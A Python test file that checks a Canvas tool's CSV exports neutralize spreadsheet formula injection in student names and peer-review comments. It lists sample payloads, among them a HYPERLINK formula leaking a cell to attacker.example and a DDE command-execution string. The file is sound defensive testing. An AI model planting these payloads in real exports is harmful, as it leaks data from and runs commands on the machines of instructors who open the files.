"""CSV exports must not hand a spreadsheet an executable formula.

Peer-review comment text is authored by another student, and Canvas names and
emails are user-controlled on many instances. Those values are exported to CSV
reports that instructors open in Excel, Numbers, or Sheets, where a cell
starting with '=', '+', '-', '@', a tab, or a carriage return is evaluated as a
formula. CSV quoting does not prevent this — it only makes the value parse as a
single cell, which the spreadsheet then evaluates.
"""

import csv
import io

import pytest

from canvas_mcp.core.csv_safety import csv_row, csv_safe_cell, rows_to_csv_string

# Representative payloads. The hyperlink one is the realistic exfiltration shape:
# it renders as innocuous text and leaks a neighbouring cell on click.
ATTACKS = [
    '=1+1',
    '=HYPERLINK("https://attacker.example/?d="&A1,"Click for feedback")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
    '   =1+1',
    '=cmd|\' /c calc\'!A0',
]


class TestCsvSafeCell:
    @pytest.mark.parametrize("payload", ATTACKS)
    def test_formula_is_neutralized(self, payload):
        result = csv_safe_cell(payload)
        assert result.startswith("'"), f"{payload!r} was not neutralized"
        # The original text is preserved after the marker, so no data is lost.
        assert result[1:] == payload

    @pytest.mark.parametrize(
        "benign",
        [
            "Great work on the intro!",
            "I disagree with your thesis, but nicely argued.",
            "See section 2.1",
            "100% agree",
            "a=b",  # '=' not in first position
            "",
        ],
    )
    def test_ordinary_comments_are_untouched(self, benign):
        assert csv_safe_cell(benign) == benign

    def test_none_becomes_empty(self):
        assert csv_safe_cell(None) == ""

    @pytest.mark.parametrize("payload", ATTACKS)
    def test_neutralized_cell_parses_back_as_text(self, payload):
        """Round-trip through a real CSV writer/reader: still inert, still one cell."""
        buffer = io.StringIO()
        csv.writer(buffer).writerow([csv_safe_cell(payload), "next"])
        row = next(csv.reader(io.StringIO(buffer.getvalue())))

        assert len(row) == 2, "payload broke out of its cell"
        assert row[0][:1] == "'"
        assert row[1] == "next"


class TestCsvRow:
    def test_numeric_columns_are_left_alone(self):
        """A computed negative number must not gain a quote and become text."""
        row = csv_row(["=evil", -5, "ok"], safe_columns=[0, 2])
        assert row == ["'=evil", "-5", "ok"]

    def test_all_columns_untrusted_by_default(self):
        assert csv_row(["=a", "=b"]) == ["'=a", "'=b"]


class TestRowsToCsvString:
    def test_embedded_delimiters_do_not_break_the_row(self):
        """The hand-rolled f-string exporter mis-quoted these; the stdlib does not."""
        nasty = 'He said "great", then\nadded a newline'
        out = rows_to_csv_string(["a", "b"], [[csv_safe_cell(nasty), 1]])
        rows = list(csv.reader(io.StringIO(out)))

        assert rows[0] == ["a", "b"]
        assert rows[1] == [nasty, "1"], "value did not survive a round-trip intact"


class TestPeerReviewExportRow:
    """The real export row builder, not just the primitive."""

    def test_student_authored_comment_is_neutralized(self):
        from canvas_mcp.tools.peer_review_comments import _peer_review_csv_row

        row = _peer_review_csv_row({
            "review_id": 1,
            "reviewer": {"student_id": 10, "student_name": "=cmd|' /c calc'!A0"},
            "reviewee": {"student_id": 20, "student_name": "Normal Name"},
            "review_content": {
                "comment_text": '=HYPERLINK("https://attacker.example","x")',
                "word_count": 3,
                "character_count": 40,
                "timestamp": "2026-08-08",
            },
        })

        assert row[2].startswith("'")  # reviewer_name
        assert row[5].startswith("'")  # comment_text
        assert row[4] == "Normal Name"  # untouched
        # Counts stay numeric so the spreadsheet can still aggregate them.
        assert row[6] == 3
        assert row[7] == 40


class TestCompletionCsvReport:
    """The analytics CSV path, which was assembled by f-string concatenation."""

    def test_names_are_neutralized_and_quoting_is_correct(self):
        from canvas_mcp.core.peer_reviews import PeerReviewAnalyzer

        analytics = {
            "completion_groups": {
                "none_complete": [{
                    "student_id": 1,
                    "student_name": '=1+1',
                    "assigned_count": 2,
                    "completed_count": 0,
                    "completion_rate": 0.0,
                    "pending_reviews": [
                        {"reviewee_name": "Comma, Name", "reviewee_id": 9}
                    ],
                }],
                "partial_complete": [],
                "all_complete": [],
            }
        }

        report = PeerReviewAnalyzer._generate_csv_report(
            PeerReviewAnalyzer.__new__(PeerReviewAnalyzer), analytics, {}
        )["report"]
        rows = list(csv.reader(io.StringIO(report)))

        assert rows[0][1] == "student_name"
        assert rows[1][1] == "'=1+1"
        # The comma inside a name stays inside its own cell.
        assert len(rows[1]) == len(rows[0])
        assert "Comma, Name (9)" in rows[1][6]
